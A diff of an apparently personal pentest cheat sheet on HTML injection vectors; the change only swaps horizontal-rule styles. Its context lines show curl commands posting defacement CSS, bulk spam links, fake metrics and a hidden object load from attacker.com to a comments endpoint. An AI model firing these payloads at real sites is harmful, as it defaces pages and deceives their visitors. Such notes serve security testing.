@@ -17,7 +17,7 @@ linked:
 ---
 # HTML Injection - Vectores Comunes
 
-***
+---
 
 ## Phishing via Fake Form / Login
 
@@ -50,7 +50,7 @@ linked:
 </div>
 ```
 
-___
+---
 
 ## Defacement / Page Modification
 
@@ -68,7 +68,7 @@ ___
 | `curl -X POST -d 'comment=<style>body::before{content:"DEFACED";position:fixed;top:0;left:0;width:100vw;background:red;color:white;font-size:60px;z-index:9999}</style>' https://target/comments` | CSS ::before pseudo-element | CSS-only inject. |
 ^htmli-vector-deface
 
-___
+---
 
 ## SEO / Social Engineering Links
 
@@ -87,7 +87,7 @@ ___
 | `for i in {1..50}; do curl -X POST -d "comment=<a href=https://spam$i.com>buy</a>" https://target/comments; done` | Bulk spam mass injection | Volume. |
 ^htmli-vector-seo
 
-___
+---
 
 ## Visible Content Injection
 
@@ -106,7 +106,7 @@ ___
 | `curl -X POST -d 'comment=<span style="font-size:80px;background:red;color:white">999</span> people online' https://target/comments` | Fake counter metrics | Fake metrics. |
 ^htmli-vector-content
 
-___
+---
 
 ## Hidden Elements / Iframe Abuse
 
@@ -126,4 +126,4 @@ ___
 | `curl -X POST -d 'comment=<object data="https://attacker.com/page" width=0 height=0></object>' https://target/comments` | Object tag hidden load | Object embed. |
 ^htmli-vector-hidden
 
-***
+---
